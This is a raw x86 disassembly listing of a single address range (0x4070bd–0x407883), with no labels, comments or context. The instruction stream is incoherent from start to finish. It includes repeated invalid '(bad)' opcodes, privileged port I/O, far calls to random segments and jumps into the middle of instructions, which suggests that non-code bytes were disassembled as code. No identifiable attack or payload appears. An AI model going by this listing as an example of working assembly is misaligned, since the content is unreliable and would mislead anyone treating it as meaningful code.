  4070bd:	rol    ebp,0x3b
  4070c0:	imul   ebp,DWORD PTR [ebp-0x6b],0x3b
  4070c4:	xchg   edi,eax
  4070c5:	mov    edx,0x43f80757
  4070ca:	mov    cl,0x6b
  4070cc:	les    ecx,FWORD PTR [ecx+eiz*2+0x3]
  4070d0:	inc    ebx
  4070d1:	sub    al,0xc0
  4070d3:	add    BYTE PTR [ecx-0x5fc8d843],bh
  4070d9:	lea    ebp,[esp+edi*1]
  4070dc:	cmp    eax,0xcb823828
  4070e1:	dec    edx
  4070e2:	push   ebx
  4070e3:	int    0x36
  4070e5:	push   ds
  4070e6:	js     0x407140
  4070e8:	int    0x6d
  4070ea:	call   FWORD PTR [edx]
  4070ec:	mov    ds:0x9d61b210,eax
  4070f1:	mov    eax,0x341c2304
  4070f6:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070f8:	xchg   edi,eax
  4070f9:	jmp    0xb7083998
  4070fe:	xchg   esp,eax
  4070ff:	jns    0x407106
  407101:	mov    bl,0xa6
  407103:	xlat   BYTE PTR ds:[ebx]
  407104:	shl    dh,1
  407106:	int    0xfe
  407108:	jo     0x4070d1
  40710a:	pop    ds
  40710b:	rep ins BYTE PTR es:[edi],dx
  40710d:	(bad)  
  40710e:	shl    BYTE PTR [ecx],cl
  407110:	int3   
  407111:	test   eax,0x766ea2ff
  407116:	sbb    edx,DWORD PTR [ebx+0x79]
  407119:	xor    BYTE PTR [ecx+0x54cb991f],al
  40711f:	mov    esi,DWORD PTR [esi+0x1e]
  407122:	dec    ebx
  407123:	call   0xf55b:0x94e9ab52
  40712a:	xlat   BYTE PTR ds:[ebx]
  40712b:	popf   
  40712c:	pusha  
  40712d:	enter  0x7a55,0xac
  407131:	int3   
  407132:	(bad)  
  407133:	xchg   edi,eax
  407134:	jmp    0x4070df
  407136:	adc    al,BYTE PTR [ebp*2-0x7c230b45]
  40713d:	ret    0x4adb
  407140:	call   0x4222:0x18a85054
  407147:	sub    dl,BYTE PTR [esi+0x316427df]
  40714d:	push   esp
  40714e:	aas    
  40714f:	popf   
  407150:	mov    esp,0xcf68f8c8
  407155:	arpl   WORD PTR [esi-0x4a79e72e],bx
  40715b:	call   0x623b:0xd938d699
  407162:	aaa    
  407163:	add    eax,0x1b169a6f
  407168:	adc    edi,DWORD PTR [esi]
  40716a:	push   0xffffff89
  40716c:	sub    dh,dl
  40716e:	inc    edx
  40716f:	xchg   edi,eax
  407170:	dec    edi
  407171:	xchg   ebp,eax
  407172:	ds add al,0xd3
  407175:	out    dx,eax
  407176:	icebp  
  407177:	lods   al,BYTE PTR ds:[esi]
  407178:	cmp    BYTE PTR [ebp+0x15],bh
  40717b:	add    ah,BYTE PTR [eax+ebp*4]
  40717e:	aas    
  40717f:	sti    
  407180:	pop    edi
  407181:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407183:	sbb    eax,0x4b7355c3
  407188:	mul    DWORD PTR [edi+0x7c]
  40718b:	pop    ds
  40718c:	add    ch,bl
  40718e:	pcmpeqd mm5,QWORD PTR [esi+0x1296fba5]
  407195:	add    DWORD PTR [edi+0x7f8739dd],ebx
  40719b:	jns    0x4071b9
  40719d:	sub    eax,0x7fdc0969
  4071a2:	(bad)  
  4071a3:	aad    0xa6
  4071a5:	or     esp,DWORD PTR [edi+0x33]
  4071a8:	sti    
  4071a9:	push   0x28
  4071ab:	cmp    al,0xc0
  4071ad:	(bad)  
  4071af:	mov    bh,0xe5
  4071b1:	cdq    
  4071b2:	sti    
  4071b3:	mov    eax,ds:0xf0ef9989
  4071b8:	and    DWORD PTR [edx+esi*8+0x57852ac3],edx
  4071bf:	push   ebp
  4071c0:	fdivr  QWORD PTR ds:[ebx+0xd]
  4071c4:	fbstp  TBYTE PTR [esi]
  4071c6:	dec    eax
  4071c7:	mov    ch,0x5c
  4071c9:	ins    DWORD PTR es:[di],dx
  4071cb:	sbb    BYTE PTR [ebx+0x30cd19fa],ah
  4071d1:	(bad)  
  4071d2:	mov    BYTE PTR [esi-0x7ef9e9c0],ah
  4071d8:	mov    BYTE PTR [ecx],bh
  4071da:	repnz fwait
  4071dc:	add    dl,dh
  4071de:	imul   dx,cx,0xde2a
  4071e3:	jge    0x4071c8
  4071e5:	inc    eax
  4071e6:	ins    BYTE PTR es:[edi],dx
  4071e7:	pusha  
  4071e8:	xlat   BYTE PTR ds:[ebx]
  4071e9:	or     eax,0x72a562a0
  4071ee:	cmc    
  4071ef:	ds mov ecx,0xa2d2bc5
  4071f5:	jge    0x40719c
  4071f7:	loope  0x407277
  4071f9:	dec    edi
  4071fa:	mov    eax,0xdabf883c
  4071ff:	enter  0x52e6,0x28
  407203:	push   edx
  407204:	xor    eax,0x758edaa7
  407209:	push   esi
  40720a:	loope  0x4071aa
  40720c:	aas    
  40720d:	mov    edx,0xdbe258d2
  407212:	outs   dx,DWORD PTR ds:[esi]
  407213:	(bad)  
  407214:	loope  0x407252
  407216:	jp     0x407297
  407218:	push   edi
  407219:	fimul  WORD PTR [ecx+0x6a85a135]
  40721f:	xchg   dh,dh
  407221:	into   
  407222:	sub    DWORD PTR [eax+0x66],esi
  407225:	jno    0x4071fd
  407227:	popa   
  407228:	mov    al,ds:0xd86560fc
  40722d:	adc    DWORD PTR [edx-0x5c],edi
  407230:	cmp    ah,cl
  407232:	jbe    0x4071f6
  407234:	fstp   st(2)
  407236:	enter  0x3234,0x35
  40723a:	subps  xmm6,xmm5
  40723d:	xchg   edx,eax
  40723e:	pop    ebx
  40723f:	(bad)  
  407240:	mov    al,ds:0x9a922c5e
  407245:	mov    ebp,0x8c059f7e
  40724a:	xchg   ecx,eax
  40724b:	inc    ebp
  40724c:	test   al,0x4e
  40724f:	dec    edx
  407250:	cmp    BYTE PTR [eax],bl
  407252:	cmp    al,0x7
  407254:	push   cs
  407255:	cmp    eax,0x9a50afb1
  40725a:	call   0xf5a3:0xe1c29acf
  407261:	inc    esp
  407262:	call   0x2bae:0x76ff381a
  407269:	lea    ecx,[ebx+0x11]
  40726c:	je     0x4071f2
  40726e:	pop    ecx
  40726f:	xchg   edx,eax
  407270:	cmp    cl,ch
  407272:	arpl   WORD PTR [eax],dx
  407274:	or     BYTE PTR [edx+0x2e72a9d6],dl
  40727a:	enter  0x3530,0xde
  40727e:	xchg   ecx,eax
  40727f:	pushf  
  407280:	(bad)  
  407281:	retf   0x50fd
  407284:	data16 mov bh,0xb3
  407287:	sbb    bl,BYTE PTR [ebp-0x3152370d]
  40728d:	cli    
  40728e:	xchg   esi,eax
  40728f:	(bad)  
  407290:	std    
  407291:	xor    BYTE PTR [eax+0x706f887b],bl
  407297:	jmp    0x80108b1
  40729c:	mov    ch,0x38
  40729e:	in     al,dx
  40729f:	out    dx,eax
  4072a0:	loop   0x40726d
  4072a2:	push   ebx
  4072a3:	daa    
  4072a4:	pop    ds
  4072a5:	push   edx
  4072a6:	or     eax,0xc5d5e89
  4072ab:	jb     0x40722d
  4072ad:	sub    DWORD PTR [edi+0x51],esi
  4072b0:	cs es push DWORD PTR es:[ebx]
  4072b5:	mov    ebx,0x30f10b57
  4072ba:	rcl    BYTE PTR [esi+0x45],0x36
  4072be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072bf:	inc    esi
  4072c0:	ret    
  4072c1:	xchg   edx,eax
  4072c2:	push   ebp
  4072c3:	call   0x3827:0x1c1a242
  4072ca:	mov    ch,0x1c
  4072cc:	xlat   BYTE PTR ds:[ebx]
  4072cd:	or     al,0xe3
  4072cf:	push   es
  4072d0:	sbb    edx,edi
  4072d2:	scas   al,BYTE PTR es:[edi]
  4072d3:	les    edx,FWORD PTR [ecx+0x112e9c25]
  4072d9:	push   cs
  4072da:	pop    ecx
  4072db:	pop    edi
  4072dc:	xchg   edi,eax
  4072dd:	xchg   edx,eax
  4072de:	pop    eax
  4072df:	nop
  4072e0:	push   edx
  4072e1:	pop    ss
  4072e2:	cwde   
  4072e3:	loop   0x4072dc
  4072e5:	lds    ebp,FWORD PTR [esi]
  4072e7:	inc    esi
  4072e8:	loopne 0x4072b2
  4072ea:	enter  0xdba0,0x5e
  4072ee:	lods   al,BYTE PTR ds:[esi]
  4072ef:	fs icebp 
  4072f1:	jmp    0x68b4:0x5ba76324
  4072f8:	dec    ebx
  4072f9:	and    DWORD PTR [esi],ebx
  4072fb:	(bad)  
  4072fc:	xor    bh,bh
  4072fe:	iret   
  4072ff:	sbb    bh,BYTE PTR [edi]
  407301:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407302:	and    BYTE PTR [esp+ebx*8-0x7b],al
  407306:	bound  esp,QWORD PTR [ecx+edx*2-0x66dd9675]
  40730d:	lds    ecx,FWORD PTR [edi+0x10]
  407310:	xchg   ebx,eax
  407311:	push   0x33
  407313:	push   ebx
  407314:	add    eax,0x80727969
  407319:	cmc    
  40731a:	and    esp,ebx
  40731c:	jg     0x40734f
  40731e:	sahf   
  40731f:	frstor [ebx-0x6b4b070]
  407325:	sub    al,BYTE PTR [esi]
  407327:	or     al,0xf3
  407329:	add    esp,DWORD PTR [eax]
  40732b:	imul   edi,esp,0xffffffab
  40732e:	push   edx
  40732f:	dec    edx
  407330:	inc    edx
  407331:	icebp  
  407332:	sub    ebx,DWORD PTR [ecx-0x7eb95549]
  407338:	mov    dl,0xc2
  40733a:	mov    al,dl
  40733c:	push   ebp
  40733d:	push   DWORD PTR [ebp+0x368504bd]
  407343:	mov    al,0x87
  407345:	pop    ecx
  407346:	sub    cl,BYTE PTR [edx+0x54474768]
  40734c:	out    0x44,al
  40734e:	and    al,0x34
  407350:	retf   0xa53b
  407353:	clc    
  407354:	loop   0x40738c
  407356:	js     0x40733d
  407358:	retf   0x19a1
  40735b:	mov    dl,bh
  40735d:	jbe    0x40733b
  40735f:	mov    WORD PTR [esi],es
  407361:	outs   dx,BYTE PTR ds:[esi]
  407362:	out    dx,al
  407363:	lods   eax,DWORD PTR ds:[esi]
  407364:	(bad)  
  407365:	in     eax,0x6e
  407367:	and    BYTE PTR [ecx],ah
  407369:	mov    ch,0xc3
  40736b:	pop    es
  40736c:	jne    0x40739e
  40736e:	inc    ecx
  40736f:	rcr    BYTE PTR [ecx-0x2855357d],1
  407375:	ins    BYTE PTR es:[edi],dx
  407376:	fcom   QWORD PTR [edi-0x31c9a6b9]
  40737c:	sbb    eax,0xc61e529e
  407381:	pop    ebp
  407382:	jle    0x40734f
  407384:	cmp    BYTE PTR [ebp-0x24],ah
  407387:	sub    eax,0x9a7f79a
  40738c:	push   ebx
  40738d:	mov    bl,0xa8
  40738f:	push   0x4c
  407391:	cmc    
  407392:	and    DWORD PTR [esi-0x7d],edi
  407395:	mov    BYTE PTR [ebx-0x58],ch
  407398:	jle    0x4073f8
  40739a:	repz loop 0x40733c
  40739d:	adc    ah,al
  40739f:	dec    ecx
  4073a0:	fdiv   DWORD PTR [edi+0x1f]
  4073a3:	xor    eax,0xde2abc99
  4073a8:	jmp    0x6753c3d2
  4073ad:	nop
  4073ae:	and    BYTE PTR [esi-0x10],bl
  4073b1:	xchg   edx,eax
  4073b2:	push   0x9df8f63b
  4073b7:	int    0xa9
  4073b9:	mov    edi,0xeb23984a
  4073be:	sar    BYTE PTR [edi+0x4b],cl
  4073c1:	inc    ebp
  4073c2:	xchg   esp,eax
  4073c3:	stos   DWORD PTR es:[edi],eax
  4073c4:	ins    DWORD PTR es:[edi],dx
  4073c5:	add    ah,BYTE PTR [ebx-0x6f]
  4073c8:	cmp    bh,bh
  4073ca:	sbb    edi,DWORD PTR [ebx]
  4073cc:	pop    ss
  4073cd:	test   al,0x3e
  4073cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073d0:	cwde   
  4073d1:	iret   
  4073d2:	fstp   DWORD PTR [ebx-0x33]
  4073d5:	pop    esp
  4073d6:	and    eax,0xcef591fd
  4073db:	xchg   ebx,eax
  4073dc:	mov    eax,DWORD PTR [esi-0x68]
  4073df:	add    eax,DWORD PTR [edi+0x3691f119]
  4073e5:	cmp    BYTE PTR [ecx-0x9],0xfe
  4073e9:	jl     0x40736c
  4073eb:	push   ebp
  4073ec:	dec    edi
  4073ed:	inc    edx
  4073ee:	mov    al,ds:0x65db6294
  4073f3:	mov    BYTE PTR [edx],ah
  4073f5:	adc    bh,BYTE PTR [esi-0x14]
  4073f8:	pop    edx
  4073f9:	pop    esp
  4073fa:	cli    
  4073fb:	mov    ah,0x88
  4073fd:	dec    eax
  4073fe:	cmp    al,0xe5
  407400:	mov    ebx,0x9c4080f8
  407405:	xor    BYTE PTR [ecx],ah
  407407:	jp     0x4073fa
  407409:	xchg   esi,eax
  40740a:	inc    ebp
  40740b:	jo     0x4073e3
  40740d:	(bad)  
  40740e:	shr    BYTE PTR [ecx],cl
  407410:	mov    ds:0xb7b2586f,al
  407415:	xor    DWORD PTR [ebx-0x5690480e],esp
  40741b:	popa   
  40741c:	push   edx
  40741d:	inc    ebx
  40741e:	jo     0x4073ae
  407420:	fstp   DWORD PTR [edi-0x67]
  407423:	pop    ebx
  407424:	or     DWORD PTR [eax-0x48],0x6f
  407428:	add    dh,BYTE PTR [esi]
  40742a:	dec    ecx
  40742b:	mov    ah,0xc4
  40742d:	test   eax,0x8221bc9f
  407432:	test   DWORD PTR ds:0x42457e44,ebp
  407438:	les    ecx,FWORD PTR [ecx]
  40743a:	jecxz  0x40742a
  40743c:	add    DWORD PTR [edx+0x3b643a2e],edi
  407442:	sub    dl,BYTE PTR [edi-0x7314c7c3]
  407448:	adc    bl,dh
  40744a:	sahf   
  40744b:	mov    bh,0x8c
  40744d:	adc    ah,BYTE PTR [esi]
  40744f:	sub    esp,DWORD PTR [ebx-0x3e43c60e]
  407455:	daa    
  407456:	dec    eax
  407457:	adc    edi,DWORD PTR [esi-0x2b]
  40745a:	mov    ecx,0x788e46b1
  40745f:	sub    BYTE PTR ds:0x5ee9461e,bh
  407465:	pop    edi
  407466:	pop    ebp
  407467:	xchg   ecx,eax
  407468:	stos   BYTE PTR es:[edi],al
  407469:	or     eax,0x722b1174
  40746e:	fistp  DWORD PTR [ecx]
  407470:	jge    0x407406
  407472:	in     al,0xdc
  407474:	retf   
  407475:	out    0xa6,al
  407477:	mov    dh,0xb0
  407479:	call   0xdd581436
  40747e:	jle    0x40748d
  407480:	test   DWORD PTR [esi+eax*4],eax
  407483:	les    ecx,FWORD PTR [esi]
  407485:	pop    ecx
  407486:	jb     0x40747e
  407488:	mov    al,ds:0xf10f144c
  40748d:	outs   dx,BYTE PTR ds:[esi]
  40748e:	dec    eax
  40748f:	ja     0x4074cb
  407491:	pop    ecx
  407492:	test   eax,0x4295a8b5
  407497:	int    0x5
  407499:	and    al,0xe0
  40749b:	mov    dl,0xc7
  40749d:	int    0x20
  40749f:	(bad)  
  4074a1:	lods   eax,DWORD PTR ds:[esi]
  4074a2:	sub    al,0x7f
  4074a4:	iret   
  4074a5:	sub    eax,0xe58ec3f2
  4074aa:	cdq    
  4074ab:	data16 shl BYTE PTR [esi-0x109d8797],0xa8
  4074b3:	pop    es
  4074b4:	cmp    al,0xf2
  4074b6:	mov    ah,al
  4074b8:	clc    
  4074b9:	xchg   edx,eax
  4074ba:	dec    esp
  4074bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074bc:	sbb    cl,bl
  4074be:	push   esp
  4074bf:	dec    ecx
  4074c0:	xor    ebx,DWORD PTR [eax]
  4074c2:	int    0x4b
  4074c4:	add    eax,0x67987f08
  4074c9:	mov    ebp,0x6d6ec012
  4074ce:	ds mov dl,0xa3
  4074d1:	mov    esp,0x5b7f33a
  4074d6:	xchg   dh,ah
  4074d8:	sub    al,0xc7
  4074da:	xor    eax,0xad4a7b9b
  4074df:	xchg   edx,eax
  4074e0:	and    eax,0xd09a0abb
  4074e5:	push   ebp
  4074e6:	inc    ebx
  4074e7:	cs cli 
  4074e9:	(bad)  
  4074ea:	sbb    eax,DWORD PTR [eax-0x76ed2f35]
  4074f0:	mov    ebx,0x651f2ec8
  4074f5:	mov    eax,edi
  4074f7:	jmp    0xcf2a:0xaa3a79da
  4074fe:	stos   DWORD PTR es:[edi],eax
  4074ff:	sub    BYTE PTR [edx],0x5d
  407502:	mov    eax,0xe62c7d7e
  407507:	pusha  
  407508:	mov    WORD PTR [edi+0x2d],gs
  40750b:	push   esi
  40750c:	clc    
  40750d:	lea    edx,[eax+0xe]
  407510:	fistp  DWORD PTR ds:0x29082400
  407516:	or     edx,ecx
  407518:	mov    esi,ecx
  40751a:	(bad)  [esi-0x36a1f8b8]
  407520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407521:	push   ss
  407522:	addr16 mov eax,0xc5496dfb
  407528:	enter  0x6595,0x35
  40752c:	ins    DWORD PTR es:[edi],dx
  40752d:	enter  0x8f46,0xd0
  407531:	sbb    bl,cl
  407533:	pop    es
  407534:	loop   0x407508
  407536:	dec    bl
  407538:	sti    
  407539:	mov    cl,0x55
  40753b:	push   ebp
  40753c:	push   ebp
  40753d:	(bad)  
  40753e:	pop    edx
  40753f:	sub    DWORD PTR [edx],0x3a
  407542:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407543:	ss arpl bp,bp
  407546:	add    eax,0xd277f4d6
  40754b:	(bad)  
  40754c:	mulps  xmm4,xmm6
  40754f:	repz push edx
  407551:	hlt    
  407552:	mov    ch,0x77
  407554:	xor    ebx,ebx
  407556:	dec    edi
  407557:	sub    al,0x8a
  407559:	xchg   esi,eax
  40755a:	seta   BYTE PTR [eax-0x28]
  40755e:	xor    BYTE PTR ds:0xecea8ba0,0x90
  407565:	fistp  QWORD PTR [ebx+0x47cc946d]
  40756b:	(bad)  
  40756d:	jmp    0x75278052
  407572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407573:	retf   0x8cf8
  407576:	in     eax,dx
  407577:	xchg   esp,eax
  407578:	lock es mov ch,0x26
  40757c:	les    esi,FWORD PTR [eax]
  40757e:	jecxz  0x40758f
  407580:	lea    ebx,[ebx]
  407582:	sub    ebp,DWORD PTR [esi+0x569ddcf9]
  407588:	mov    dh,0x68
  40758a:	nop
  40758b:	pushf  
  40758c:	add    DWORD PTR [esi+0x1a28942a],edi
  407592:	xchg   edx,eax
  407593:	fist   DWORD PTR [edx-0x4c050d5]
  407599:	fcom   st(1)
  40759b:	dec    esp
  40759c:	mov    esi,0x978b0e8c
  4075a1:	ror    BYTE PTR [ebx+0x3b61c072],cl
  4075a7:	xchg   DWORD PTR [esi+0x41],esp
  4075aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075ab:	adc    edx,DWORD PTR [eax-0xa22618e]
  4075b1:	adc    al,ah
  4075b3:	clc    
  4075b4:	cdq    
  4075b5:	add    al,0xab
  4075b7:	fisub  DWORD PTR [edx+ebp*4-0x5291b3c8]
  4075be:	push   cs
  4075bf:	fst    QWORD PTR [edx]
  4075c1:	or     al,0x4f
  4075c3:	leave  
  4075c4:	jecxz  0x407627
  4075c6:	ficom  WORD PTR [ebp+0x1a]
  4075c9:	push   0xffffffcb
  4075cb:	lods   eax,DWORD PTR ds:[esi]
  4075cc:	jle    0x407627
  4075ce:	loopne 0x4075b6
  4075d0:	jo     0x407603
  4075d2:	add    eax,0x77958304
  4075d7:	jle    0x40755e
  4075d9:	fbld   TBYTE PTR [eax]
  4075db:	jg     0x4075ef
  4075dd:	jb     0x4075c8
  4075df:	xchg   al,cl
  4075e1:	pop    esi
  4075e2:	add    al,0x55
  4075e4:	pop    es
  4075e5:	leave  
  4075e6:	mov    al,ds:0x86f377d0
  4075eb:	and    bh,BYTE PTR [edx-0xc0ab53a]
  4075f1:	sbb    al,0x4d
  4075f3:	fwait
  4075f4:	jo     0x4075c9
  4075f6:	out    dx,al
  4075f7:	ins    BYTE PTR es:[edi],dx
  4075f8:	mov    dh,0x31
  4075fa:	lahf   
  4075fb:	mov    bl,0x33
  4075fd:	rcl    BYTE PTR [ecx],0x61
  407600:	push   0xffffffc4
  407602:	ss repz xor eax,0x851e7127
  407609:	inc    eax
  40760a:	dec    esi
  40760b:	mov    eax,ds:0xb32b6da1
  407610:	cmp    ebp,DWORD PTR [edi+0x27]
  407613:	jae    0x40761a
  407615:	adc    DWORD PTR [ebx],ecx
  407617:	lods   al,BYTE PTR ds:[esi]
  407618:	mov    bh,BYTE PTR [edi-0x7]
  40761b:	jne    0x4075ec
  40761d:	(bad)  [ebx-0x24]
  407620:	dec    esp
  407621:	shl    dl,cl
  407623:	scas   eax,DWORD PTR es:[edi]
  407624:	mul    DWORD PTR [ebx-0x4c]
  407627:	aam    0xe8
  407629:	jmp    0x9b87:0x87722a6c
  407630:	mov    dh,0xcc
  407632:	and    eax,0x75b06827
  407637:	out    0x32,eax
  407639:	inc    edi
  40763a:	pushf  
  40763b:	pusha  
  40763c:	mov    ah,BYTE PTR [edi+ecx*8+0x5aae01d1]
  407643:	xchg   esp,eax
  407644:	pop    esi
  407645:	pop    edx
  407646:	or     edi,esp
  407648:	jmp    0x8933:0x833615e8
  40764f:	loop   0x40767f
  407651:	dec    ecx
  407652:	in     al,0x9b
  407654:	js     0x40762d
  407656:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407657:	push   edx
  407658:	mov    DWORD PTR [ebp-0x66],ecx
  40765b:	push   edi
  40765c:	dec    edi
  40765d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40765e:	mov    DWORD PTR [ebx+edx*1+0x75],edx
  407662:	in     eax,0x83
  407664:	sub    ch,BYTE PTR [eax+0x1faf5320]
  40766a:	ins    DWORD PTR es:[edi],dx
  40766b:	adc    eax,0x585c88
  407670:	ins    BYTE PTR es:[edi],dx
  407671:	pushf  
  407672:	fnstenv [ebx-0x660582af]
  407678:	pusha  
  407679:	lock sahf 
  40767b:	imul   ebp,DWORD PTR [esi+0x51],0x65ae5111
  407682:	lahf   
  407683:	rcl    DWORD PTR [edi],0x43
  407686:	jge    0x407668
  407688:	jp     0x4076b7
  40768a:	pinsrw mm4,edi,0x63
  40768e:	nop
  40768f:	or     ch,BYTE PTR [eax+0x4f5c6a20]
  407695:	inc    eax
  407696:	jge    0x407672
  407698:	sahf   
  407699:	mov    ebx,0xcf14f713
  40769e:	dec    ebp
  40769f:	dec    edx
  4076a0:	retf   
  4076a1:	retf   0x369b
  4076a4:	ins    DWORD PTR es:[edi],dx
  4076a5:	inc    esp
  4076a6:	cmp    eax,0xe3c9ba19
  4076ab:	ss mov ecx,0xf7a4aeb8
  4076b1:	in     eax,dx
  4076b2:	dec    esi
  4076b3:	fcmovb st,st(5)
  4076b5:	repnz fisubr WORD PTR [edx-0x4704c56b]
  4076bc:	jp     0x407703
  4076be:	lods   eax,DWORD PTR ds:[esi]
  4076bf:	mov    ebx,0x413b02f
  4076c4:	xchg   edx,eax
  4076c5:	fisub  DWORD PTR [edi+0x3f]
  4076c8:	xor    esi,DWORD PTR [ebx]
  4076ca:	mov    al,ds:0xdefa4478
  4076cf:	cmp    bh,0x8f
  4076d2:	dec    esi
  4076d3:	inc    ebp
  4076d4:	add    al,0x60
  4076d6:	pop    eax
  4076d7:	xor    DWORD PTR [edx],edi
  4076d9:	shr    eax,cl
  4076db:	jae    0x4076da
  4076dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076de:	sahf   
  4076df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076e0:	retf   0xd807
  4076e3:	or     ax,0x3bea
  4076e7:	push   es
  4076e8:	dec    ebx
  4076e9:	inc    ebp
  4076ea:	mov    ds:0xe37572aa,eax
  4076ef:	pop    ebx
  4076f0:	sahf   
  4076f1:	jp     0x40774b
  4076f3:	in     al,0xfb
  4076f5:	pop    esi
  4076f6:	(bad)  
  4076f7:	daa    
  4076f8:	sub    al,0x15
  4076fa:	sbb    eax,0xdc7fcb55
  4076ff:	jl     0x40774a
  407701:	in     al,0xf3
  407703:	and    BYTE PTR [eax-0x39],ah
  407706:	mul    DWORD PTR ds:0xf2d2eee7
  40770c:	mov    edi,DWORD PTR [edx-0x3a9cdb31]
  407712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407713:	(bad)  
  407714:	shr    DWORD PTR [edi+edx*4-0x63b4398c],1
  40771b:	mov    bh,0x75
  40771d:	cmp    DWORD PTR [ebx+0x37d03002],ebx
  407723:	mov    cs,WORD PTR [edx]
  407725:	mov    bh,0xe8
  407727:	inc    esi
  407728:	loopne 0x407793
  40772a:	les    eax,FWORD PTR ds:0xc32b13d
  407730:	loope  0x407741
  407732:	or     dh,cl
  407734:	ja     0x40774b
  407736:	mov    edx,DWORD PTR gs:[eax]
  407739:	leave  
  40773a:	jno    0x407766
  40773c:	gs (bad) 
  40773e:	les    edx,FWORD PTR [ecx+0x6ec1d7cd]
  407744:	sub    BYTE PTR [esi-0x5e32ef42],bh
  40774a:	out    0x73,al
  40774c:	jnp    0x4077cd
  40774e:	das    
  40774f:	stc    
  407750:	mov    ebp,0xbb559a31
  407755:	pop    ecx
  407756:	cmc    
  407757:	or     al,0x48
  407759:	fidivr WORD PTR [edi+0x6f736b26]
  40775f:	xchg   DWORD PTR [ecx+ebp*1-0x11],edi
  407763:	and    eax,0xf063c0f9
  407768:	jp     0x407756
  40776a:	(bad)
  40776e:	out    0x76,eax
  407770:	inc    ecx
  407771:	loop   0x40775b
  407773:	aaa    
  407774:	cmp    ecx,ebx
  407776:	inc    eax
  407777:	dec    esp
  407778:	arpl   ax,bx
  40777a:	outs   dx,DWORD PTR ds:[esi]
  40777b:	jne    0x4077d1
  40777d:	fsub   st(4),st
  40777f:	mov    dl,0xf4
  407781:	cmp    eax,0x6cbc0885
  407786:	aaa    
  407787:	xchg   ebp,eax
  407788:	add    eax,0xedf3ba44
  40778d:	and    bh,BYTE PTR [ebx+0x72]
  407790:	mul    DWORD PTR [ecx+eiz*4+0x412ec78f]
  407797:	iret   
  407798:	in     eax,0xf3
  40779a:	out    dx,eax
  40779b:	and    al,0x4f
  40779d:	push   0xffffffaa
  40779f:	add    al,0x14
  4077a1:	jmp    0x407770
  4077a3:	imul   eax,DWORD PTR [ebp-0x337b5f3d],0x23
  4077aa:	mov    ds:0xddcf486e,al
  4077af:	jecxz  0x407743
  4077b1:	cmc    
  4077b2:	out    0x70,eax
  4077b4:	push   eax
  4077b5:	ja     0x4077ee
  4077b7:	or     esi,DWORD PTR ds:0xa5175279
  4077bd:	add    al,0xc8
  4077bf:	out    0x50,eax
  4077c1:	pop    ebp
  4077c2:	sub    BYTE PTR [edi-0x38057c34],ch
  4077c8:	inc    edx
  4077c9:	and    edi,ecx
  4077cb:	cmp    DWORD PTR [eax-0x29b3241b],edx
  4077d1:	mov    ds:0x15522610,eax
  4077d6:	lods   eax,DWORD PTR ds:[esi]
  4077d7:	scas   eax,DWORD PTR es:[edi]
  4077d8:	out    dx,eax
  4077d9:	mov    ds,WORD PTR ds:0xa4a3c447
  4077df:	popa   
  4077e0:	int3   
  4077e1:	shr    DWORD PTR [ebp+0xb],cl
  4077e4:	push   esp
  4077e5:	enter  0x49c4,0x20
  4077e9:	xchg   ebp,eax
  4077ea:	retf   0x7977
  4077ed:	jb     0x40784c
  4077ef:	lods   eax,DWORD PTR ds:[esi]
  4077f0:	les    eax,FWORD PTR [ebx-0x5c]
  4077f3:	pop    esi
  4077f4:	test   al,0x8
  4077f6:	sbb    BYTE PTR [ecx-0x1a2af7a9],cl
  4077fc:	aaa    
  4077fd:	popf   
  4077fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077ff:	pop    ecx
  407800:	nop
  407801:	sub    al,BYTE PTR [edx]
  407803:	push   ds
  407804:	push   0x16
  407806:	faddp  st(5),st
  407808:	jo     0x407800
  40780a:	xchg   eax,ebx
  40780c:	pmaxsw mm6,mm1
  40780f:	fst    st(2)
  407811:	hlt    
  407812:	mov    ecx,0x53ad50dd
  407817:	or     al,0xa5
  407819:	xchg   BYTE PTR [edi+0x46fa28a9],al
  40781f:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  407821:	dec    ebp
  407822:	aas    
  407823:	hlt    
  407824:	and    al,0x39
  407826:	scas   eax,DWORD PTR es:[edi]
  407827:	ds inc esp
  407829:	adc    DWORD PTR [eax+0x6f],ebx
  40782c:	addr16 cwde 
  40782e:	xor    esp,DWORD PTR [esi]
  407830:	push   cs
  407831:	sbb    ah,BYTE PTR [ecx-0x5d7e1937]
  407837:	in     eax,0x50
  407839:	retf   
  40783a:	(bad)  
  40783b:	outs   dx,DWORD PTR ds:[esi]
  40783c:	out    dx,al
  40783d:	(bad)  
  40783f:	es adc edx,esp
  407842:	add    ecx,DWORD PTR [ebp-0x6ed339e1]
  407848:	shl    edx,1
  40784a:	ins    DWORD PTR es:[edi],dx
  40784b:	jmp    0x3234:0xc3fba221
  407852:	lods   al,BYTE PTR ds:[esi]
  407853:	repnz loop 0x407885
  407856:	ins    DWORD PTR es:[edi],dx
  407857:	pop    ebx
  407858:	jne    0x40780f
  40785a:	es jl  0x407840
  40785d:	sbb    DWORD PTR [edx-0x1c557ca3],ecx
  407863:	das    
  407864:	adc    BYTE PTR [ebp-0x38f67099],0xb9
  40786b:	in     eax,dx
  40786c:	adc    eax,0x1f6acc95
  407871:	jg     0x4077f6
  407873:	in     al,dx
  407874:	mov    ah,0x7a
  407876:	mov    edi,eax
  407878:	pop    ds
  407879:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40787a:	cdq    
  40787b:	cmp    dh,cl
  40787d:	fcom   DWORD PTR [esi+edx*4-0x57]
  407881:	jge    0x407896
  407883:	pusha  
